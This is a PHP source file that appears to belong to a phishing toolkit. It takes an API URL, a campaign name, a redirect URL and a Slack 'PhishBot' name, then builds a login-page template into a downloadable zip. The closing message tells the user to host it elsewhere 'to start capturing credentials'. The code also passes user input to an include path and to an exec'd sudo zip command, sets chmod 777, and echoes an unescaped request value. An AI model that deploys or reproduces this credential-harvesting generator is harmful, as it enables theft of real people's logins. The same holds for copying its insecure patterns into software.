<?php

if(isset($_REQUEST['template'])){$template = $_REQUEST['template'];}else{$template = "";}

if(!isset($_REQUEST['APIURL'])){

?>

<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
      @import url(https://fonts.googleapis.com/css?family=Roboto:400,500,700,300,100);

body {
  background-color: #1b1e24;
  font-family: "Roboto", helvetica, arial, sans-serif;
  font-size: 24px;
  font-weight: 400;
  text-rendering: optimizeLegibility;
}

div.table-title {
   display: block;
  margin: auto;
  max-width: 600px;
  padding:5px;
  width: 100%;
}

.table-title h3 {
   color: #fafafa;
   font-size: 20px;
   font-weight: 400;
   font-style:normal;
   font-family: "Roboto", helvetica, arial, sans-serif;
   text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
   text-transform:uppercase;
}

.table-title h2 {
   color: #fafafa;
   font-size: 26px;
   font-weight: 400;
   font-style:normal;
   font-family: "Roboto", helvetica, arial, sans-serif;
   text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
   text-transform:uppercase;
}


/*** Table Styles **/

.table-fill {
  background: white;
  border-radius:3px;
  border-collapse: collapse;
  height: 275px;
  margin: auto;
  max-width: 600px;
  padding:5px;
  width: 75%;
  box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
  animation: float 5s infinite;
}

th {
  color:#FFFFFF;
  background:#d12128;
  border-bottom:4px solid #9ea7af;
  border-right: 1px solid #343a45;
  font-size:20px;
  font-weight: 120;
  padding:16px;
  text-align:center;
  text-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
  vertical-align:middle;
}

th:first-child {
  border-top-left-radius:3px;
}

th:last-child {
  border-top-right-radius:3px;
  border-right:none;
}

tr {
  border-top: 1px solid #C1C3D1;
  border-bottom-: 1px solid #C1C3D1;
  color:#666B85;
  font-size:16px;
  font-weight:normal;
  text-shadow: 0 1px 1px rgba(256, 256, 256, 0.1);
}

tr:hover td {
  background:#4E5066;
  color:#FFFFFF;
  border-top: 1px solid #22262e;
  border-bottom: 1px solid #22262e;
}

tr:first-child {
  border-top:none;
}

tr:last-child {
  border-bottom:none;
}

tr:nth-child(odd) td {
  background:#EBEBEB;
}

tr:nth-child(odd):hover td {
  background:#4E5066;
}

tr:last-child td:first-child {
  border-bottom-left-radius:3px;
}

tr:last-child td:last-child {
  border-bottom-right-radius:3px;
}

td {
  background:#FFFFFF;
  padding:10px;
  text-align:center;
  vertical-align:middle;
  font-weight:300;
  font-size:16px;
  text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
  border-right: 1px solid #C1C3D1;
}

td:last-child {
  border-right: 0px;
}

th.text-center {
  text-align: left;
}

th.text-center {
  text-align: center;
}

th.text-right {
  text-align: right;
}

td.text-center {
  text-align: left;
}

td.text-center {
  text-align: center;
}

td.text-right {
  text-align: right;
}

/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content/Box */
.modal-content {
    background-color: #fefefe;
    margin: 15% auto; /* 15% from the top and centered */
    padding: 20px;
    border: 1px solid #888;
    width: 80%; /* Could be more or less, depending on screen size */
}

/* The Close Button */
.close {
    color: #aaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
}

.close:hover,
.close:focus {
    color: black;
    text-decoration: none;
    cursor: pointer;
}

.boxsizingBorder {
    -webkit-box-sizing: border-box;
       -moz-box-sizing: border-box;
            box-sizing: border-box;
}

textarea
{
  width:100%;
}

td.input input {
    width: 100%;
    box-sizing: border-box;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
}

    </style>
<style>
/* Style buttons */
.btn {
  background-color: DodgerBlue;
  border: none;
  color: white;
  padding: 12px 30px;
  cursor: pointer;
  font-size: 20px;
}

/* Darker background on mouse-over */
.btn:hover {
  background-color: RoyalBlue;
}
</style>
<style>
body {
    margin: 0;
}
</style>
</HEAD>
<BODY>
<br><br><br><CENTER>
<FORM METHOD="POST"  ACTION="<?php $_SERVER["PHP_SELF"]; ?>">
<TABLE>
<TR><TH COLSPAN="2">Specifiy API Details for Form Submission</TH></TR>
<TR><TD>API URL: </TD><TD><INPUT TYPE="text" NAME="APIURL" VALUE="https://<?php echo $_SERVER['SERVER_NAME'];?>" PLACEHOLDER="This API URL" SIZE="40"></TD></TR>
<TR><TD>Project Name: </TD><TD><INPUT TYPE="text" NAME="Project" VALUE="" PLACEHOLDER="Project Name / Org / Phishing Campaign" SIZE="40"></TD></TR>
<TR><TD>Redirect URL: </TD><TD><INPUT TYPE="text" NAME="Redirect" VALUE="https://" PLACEHOLDER="Redirect Location Post Login" SIZE="40"></TD></TR>
<TR><TD>Slack Bot Name: </TD><TD><INPUT TYPE="text" NAME="SlackBotName" VALUE="PhishBot" PLACEHOLDER="Slack Bot Name" SIZE="40"></TD></TR>
<TR><TD>Slack Bot Logo: </TD><TD><INPUT TYPE="text" NAME="SlackEmoji" VALUE=":fishing_pole_and_fish:" PLACEHOLDER="Slack Bot Logo" SIZE="40"></TD></TR>
</TABLE><br>
<INPUT TYPE="HIDDEN" NAME="templatename" VALUE="<?php echo $template; ?>">
<INPUT TYPE="SUBMIT" VALUE="Generate Portal">
</FORM>
</CENTER>
</BODY>
</HTML>
<?php } else {

if(isset($_REQUEST['APIURL'])){$APIURL = $_REQUEST['APIURL'];}else{$APIURL = $_SERVER['SERVER_NAME'];}
if(isset($_REQUEST['Project'])){$Project = $_REQUEST['Project'];}else{$Project = "Undefined Project";}
if(isset($_REQUEST['Redirect'])){$Redirect = $_REQUEST['Redirect'];}else{$Redirect = "https://www.google.com";}
if(isset($_REQUEST['SlackBotName'])){$SlackBotName = $_REQUEST['SlackBotName'];}else{$SlackBotName = "PhishBot";}
if(isset($_REQUEST['SlackEmoji'])){$SlackEmoji = $_REQUEST['SlackEmoji'];}else{$SlackEmoji = ":fishing_pole_and_fish:";}

$templatename = preg_replace('/[^a-zA-Z0-9 ]/', '', $_REQUEST['templatename']);

$htmlpath = $templatename."/template.php";

//include($htmlpath);

ob_start();
include_once($htmlpath);
$html = ob_get_contents();
ob_end_clean();

$my_file = $templatename."/index.html";
$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
fwrite($handle, $html);

$cmdzipup = "cd ".$templatename."; sudo zip -r ../".$templatename.".zip ".$templatename." *; sudo chmod 777 ".$templatename.".zip;";
exec($cmdzipup);

?>

<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
      @import url(https://fonts.googleapis.com/css?family=Roboto:400,500,700,300,100);

body {
  background-color: #1b1e24;
  font-family: "Roboto", helvetica, arial, sans-serif;
  font-size: 24px;
  font-weight: 400;
  text-rendering: optimizeLegibility;
}

div.table-title {
   display: block;
  margin: auto;
  max-width: 600px;
  padding:5px;
  width: 100%;
}

.table-title h3 {
   color: #fafafa;
   font-size: 20px;
   font-weight: 400;
   font-style:normal;
   font-family: "Roboto", helvetica, arial, sans-serif;
   text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
   text-transform:uppercase;
}

.table-title h2 {
   color: #fafafa;
   font-size: 26px;
   font-weight: 400;
   font-style:normal;
   font-family: "Roboto", helvetica, arial, sans-serif;
   text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
   text-transform:uppercase;
}


/*** Table Styles **/

.table-fill {
  background: white;
  border-radius:3px;
  border-collapse: collapse;
  height: 275px;
  margin: auto;
  max-width: 600px;
  padding:5px;
  width: 75%;
  box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
  animation: float 5s infinite;
}

th {
  color:#FFFFFF;
  background:#d12128;
  border-bottom:4px solid #9ea7af;
  border-right: 1px solid #343a45;
  font-size:20px;
  font-weight: 120;
  padding:16px;
  text-align:center;
  text-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
  vertical-align:middle;
}

th:first-child {
  border-top-left-radius:3px;
}

th:last-child {
  border-top-right-radius:3px;
  border-right:none;
}

tr {
  border-top: 1px solid #C1C3D1;
  border-bottom-: 1px solid #C1C3D1;
  color:#666B85;
  font-size:16px;
  font-weight:normal;
  text-shadow: 0 1px 1px rgba(256, 256, 256, 0.1);
}

tr:hover td {
  background:#4E5066;
  color:#FFFFFF;
  border-top: 1px solid #22262e;
  border-bottom: 1px solid #22262e;
}

tr:first-child {
  border-top:none;
}

tr:last-child {
  border-bottom:none;
}

tr:nth-child(odd) td {
  background:#EBEBEB;
}

tr:nth-child(odd):hover td {
  background:#4E5066;
}

tr:last-child td:first-child {
  border-bottom-left-radius:3px;
}

tr:last-child td:last-child {
  border-bottom-right-radius:3px;
}

td {
  background:#FFFFFF;
  padding:10px;
  text-align:center;
  vertical-align:middle;
  font-weight:300;
  font-size:16px;
  text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
  border-right: 1px solid #C1C3D1;
}

td:last-child {
  border-right: 0px;
}

th.text-center {
  text-align: left;
}

th.text-center {
  text-align: center;
}

th.text-right {
  text-align: right;
}

td.text-center {
  text-align: left;
}

td.text-center {
  text-align: center;
}

td.text-right {
  text-align: right;
}

/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content/Box */
.modal-content {
    background-color: #fefefe;
    margin: 15% auto; /* 15% from the top and centered */
    padding: 20px;
    border: 1px solid #888;
    width: 80%; /* Could be more or less, depending on screen size */
}

/* The Close Button */
.close {
    color: #aaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
}

.close:hover,
.close:focus {
    color: black;
    text-decoration: none;
    cursor: pointer;
}

.boxsizingBorder {
    -webkit-box-sizing: border-box;
       -moz-box-sizing: border-box;
            box-sizing: border-box;
}

textarea
{
  width:100%;
}

td.input input {
    width: 100%;
    box-sizing: border-box;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
}

    </style>
<style>
/* Style buttons */
.btn {
  background-color: DodgerBlue;
  border: none;
  color: white;
  padding: 12px 30px;
  cursor: pointer;
  font-size: 20px;
}

/* Darker background on mouse-over */
.btn:hover {
  background-color: RoyalBlue;
}
</style>
<style>
body {
    margin: 0;
}
</style>
</HEAD>
<BODY><br><br><br>
<FORM ACTION="<?php echo $templatename; ?>.zip" METHOD="GET">
<button class="btn" style="width:100%" type="submit"><i class="fa fa-download"></i>Download Source HTML</button>
</FORM>
<CENTER>
<FONT COLOR="#FFFFFF">Extract contents into your web directory on another server to start capturing credentials!  Feel free to modify the source code to include your own logo/theme!</FONT>
</CENTER>
</BODY>
</HTML>

<?php } ?>
